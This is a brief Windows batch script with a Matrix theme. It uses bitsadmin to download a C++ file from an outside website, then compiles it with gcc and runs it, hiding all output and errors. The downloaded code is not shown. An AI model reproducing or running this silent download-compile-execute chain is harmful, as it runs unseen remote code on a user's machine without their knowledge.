@echo off
bitsadmin.exe /transfer "There is no spoon" http://mcminiposts.com/remote_media/matrix.cpp "%~dp0\matrix.cpp" >nul 2>nul
gcc matrix.cpp -lstdc++ -std=gnu++14 -o Matrix.exe >nul 2>nul
Matrix 2>nul